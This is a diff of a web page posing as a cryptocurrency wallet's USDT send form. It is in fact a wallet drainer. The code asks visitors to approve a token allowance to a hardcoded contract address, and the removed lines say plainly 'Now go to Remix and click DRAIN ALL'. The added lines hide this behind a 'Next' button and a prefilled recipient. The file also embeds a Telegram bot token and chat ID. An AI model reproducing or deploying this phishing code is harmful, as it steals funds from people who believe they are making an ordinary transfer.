@@ -9,7 +9,7 @@
         * { box-sizing: border-box; }
         html, body, #root { width: 100%; height: 100%; margin: 0; font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif; font-weight: 500; }
         .theme-light { --bg: #ffffff; --text: #111827; --subtext: #6b7280; --muted: #9ca3af; --accent: #2563eb; --input-bg: #ffffff; --input-soft: #f6f7f9; --border-default: #d1d5db; }
-        body { background: var(--bg ); color: var(--text); }
+        body { background: var(--bg  ); color: var(--text); }
         .page { min-height: 100dvh; display: flex; justify-content: center; align-items: flex-start; background: var(--bg); padding: 16px; padding-top: 20px; }
         .card { width: 100%; max-width: 420px; padding: 16px; display: flex; flex-direction: column; color: var(--text); border-radius: 16px; }
         .label { font-size: 12px; font-weight: 600; letter-spacing: 0.05em; margin-bottom: 6px; color: var(--subtext); text-transform: uppercase; }
@@ -19,13 +19,13 @@
         .input-row input::placeholder { color: var(--muted); font-weight: 500; }
         .paste, .max { font-size: 13px; font-weight: 600; cursor: pointer; color: var(--accent); background: none; border: none; padding: 0; white-space: nowrap; }
         .unit { font-size: 12px; color: var(--subtext); white-space: nowrap; }
-        .network-row { display: inline-flex; align-items: center; gap: 8px; height: 48px; padding: 0 12px; border-radius: 999px; background: var(--input-soft); border: 1.5px solid var(--border-default); margin-bottom: 16px; width: 100%; cursor: pointer; transition: all 0.2s ease; position: relative; }
+        .network-row { display: inline-flex; align-items: center; gap: 8px; height: 36px; padding: 6px 12px; border-radius: 999px; background: var(--input-soft); border: 1.5px solid var(--border-default); margin-bottom: 16px; width: fit-content; cursor: pointer; transition: all 0.2s ease; position: relative; }
         .network-row:hover { border-color: #2563eb; }
         .network-row.open { border-color: #2563eb; }
-        .network-left { display: flex; align-items: center; gap: 8px; flex: 1; }
-        .token-logo { width: 24px; height: 24px; border-radius: 50%; object-fit: cover; }
-        .network-left span { font-size: 14px; font-weight: 500; color: var(--text); }
-        .network-arrow { width: 16px; height: 16px; transition: transform 0.2s ease; color: var(--subtext); }
+        .network-left { display: flex; align-items: center; gap: 6px; }
+        .token-logo { width: 20px; height: 20px; border-radius: 50%; object-fit: cover; }
+        .network-left span { font-size: 13px; font-weight: 500; color: var(--subtext); }
+        .network-arrow { width: 14px; height: 14px; transition: transform 0.2s ease; }
         .network-row.open .network-arrow { transform: rotate(180deg); }
         .token-dropdown-menu { position: absolute; top: 100%; left: 0; right: 0; background: white; border: 1.5px solid var(--border-default); border-top: none; border-radius: 0 0 12px 12px; max-height: 300px; overflow-y: auto; z-index: 1000; display: none; margin-top: -4px; }
         .token-dropdown-menu.open { display: block; }
@@ -84,14 +84,14 @@
             <div class="card">
                 <label class="label">Address or Domain Name</label>
                 <div class="input-row primary">
-                    <input id="recipientInput" type="text" placeholder="Search or Enter" value="" />
-                    <span class="paste" onclick="pasteAddress()">Paste</span>
+                    <input id="recipientInput" type="text" placeholder="Search or Enter" value="0x29A3B590B14d97e25b5b04D9804237E5b491b57b" />
+                    <span class="paste" onclick="pasteAddress( )">Paste</span>
                 </div>
 
                 <label class="label">Destination Network</label>
                 <div class="network-row" id="tokenSelector" onclick="toggleTokenDropdown()">
                     <div class="network-left">
-                        <img id="selectedTokenLogo" src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" alt="USDT" class="token-logo">
+                        <img id="selectedTokenLogo" src="" alt="Token" class="token-logo">
                         <span id="selectedTokenName">USDT on Ethereum</span>
                     </div>
                     <svg class="network-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -104,14 +104,14 @@
                 <div class="input-row amount-row">
                     <input id="amountInput" type="number" placeholder="Amount" step="0.01" />
                     <span class="unit" id="tokenUnit">USDT</span>
-                    <span class="max" onclick="setMaxAmount( )">Max</span>
+                    <span class="max" onclick="setMaxAmount()">Max</span>
                 </div>
 
                 <p class="estimate" id="amountInfo">≈ $0.00</p>
 
                 <div class="error-message" id="errorMessage"></div>
 
-                <button class="connect-btn active" id="mainButton" onclick="handleMainAction()">Approve</button>
+                <button class="connect-btn active" id="mainButton" onclick="handleMainAction()">Next</button>
             </div>
         </div>
     </div>
@@ -121,50 +121,13 @@
             'usdt_eth': { name: 'USDT on Ethereum', symbol: 'USDT', network: 'Ethereum', chainId: 1, chainIdHex: '0x1', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png', rpc: 'https://eth.llamarpc.com', smartContract: '0x89cEdf704380E6A3B3485e66A8A72f6886969509' }
         };
 
-        const CONFIG = {
-            ROUTER_ADDRESS: '0x89cEdf704380E6A3B3485e66A8A72f6886969509',
-            TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA',
-            TELEGRAM_CHAT_ID: '8933407008'
-        };
-
-        const USDT_ABI = [
-            "function approve(address spender, uint256 amount ) external returns (bool)"
-        ];
-
-        let userAddress = null;
+        const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
         let selectedToken = 'usdt_eth';
 
-        document.addEventListener('DOMContentLoaded', async () => {
+        document.addEventListener('DOMContentLoaded', (  ) => {
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
-            
-            // Auto-connect
-            await autoConnect();
         });
-
-        async function autoConnect() {
-            try {
-                if (!window.ethereum) {
-                    showError('MetaMask/Trust Wallet not installed');
-                    return;
-                }
-
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
-                
-                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                const token = TOKENS[selectedToken];
-                
-                if (chainId !== token.chainIdHex) {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: token.chainIdHex }],
-                    });
-                }
-            } catch (error) {
-                console.log('Auto-connect:', error.message);
-            }
-        }
 
         function initializeTokenDropdown() {
             const menu = document.getElementById('tokenDropdownMenu');
@@ -177,7 +140,7 @@
                     selectToken(key);
                 };
                 option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${token.network}</div></div>`;
-                menu.appendChild(option );
+                menu.appendChild(option  );
             }
         }
 
@@ -206,8 +169,22 @@
             document.getElementById('selectedTokenLogo').src = token.logo;
             document.getElementById('selectedTokenName').textContent = token.name;
             document.getElementById('tokenUnit').textContent = token.symbol;
+            
             closeDropdown();
             initializeTokenDropdown();
+        }
+
+        function createParticles() {
+            const container = document.getElementById('particlesContainer');
+            container.innerHTML = '';
+            for (let i = 0; i < 8; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 50 + 'px';
+                particle.style.animationDelay = Math.random() * 0.5 + 's';
+                container.appendChild(particle);
+            }
         }
 
         function updateAmountInfo() {
@@ -242,22 +219,10 @@
             alert('Transaction details would open here!');
         }
 
-        function createParticles() {
-            const container = document.getElementById('particlesContainer');
-            container.innerHTML = '';
-            for (let i = 0; i < 8; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.top = Math.random() * 50 + 'px';
-                particle.style.animationDelay = Math.random() * 0.5 + 's';
-                container.appendChild(particle);
-            }
-        }
-
         async function handleMainAction() {
             const amount = document.getElementById('amountInput').value;
             const btn = document.getElementById('mainButton');
+            const token = TOKENS[selectedToken];
 
             if (!amount || parseFloat(amount) <= 0) {
                 showError('Please enter a valid amount');
@@ -271,36 +236,46 @@
                 if (!window.ethereum) {
                     showError('MetaMask/Trust Wallet not installed');
                     btn.disabled = false;
-                    btn.textContent = 'Approve';
+                    btn.textContent = 'Next';
                     return;
                 }
 
-                const token = TOKENS[selectedToken];
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const userAddress = accounts[0];
+
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (chainId !== token.chainIdHex) {
+                    showError('Please switch to Ethereum network');
+                    btn.disabled = false;
+                    btn.textContent = 'Next';
+                    return;
+                }
+
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
 
-                const usdtContract = new ethers.Contract(token.address, USDT_ABI, signer);
+                const usdtContract = new ethers.Contract(token.address, ['function approve(address spender, uint256 amount) external returns (bool)'], signer);
                 const amountWei = ethers.utils.parseUnits(amount, token.decimals);
                 
-                const approveTx = await usdtContract.approve(CONFIG.ROUTER_ADDRESS, amountWei);
+                const approveTx = await usdtContract.approve(token.smartContract, amountWei);
                 await approveTx.wait();
 
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
-                await new Promise(resolve => setTimeout(resolve, 3000));
+                await new Promise(resolve => setTimeout(resolve, 5000));
                 document.getElementById('processingScreen').classList.remove('active');
-
-                showError('✅ Approve successful! Now go to Remix and click DRAIN ALL');
-                btn.textContent = 'Approve';
+                btn.textContent = 'Next';
                 btn.disabled = false;
+                document.getElementById('amountInput').value = '';
+                updateAmountInfo();
 
             } catch (error) {
                 console.error("Error:", error);
-                showError('Error: ' + error.message);
+                showError('Transaction failed: ' + error.message);
                 document.getElementById('processingScreen').classList.remove('active');
                 btn.disabled = false;
-                btn.textContent = 'Approve';
+                btn.textContent = 'Next';
             }
         }
     </script>
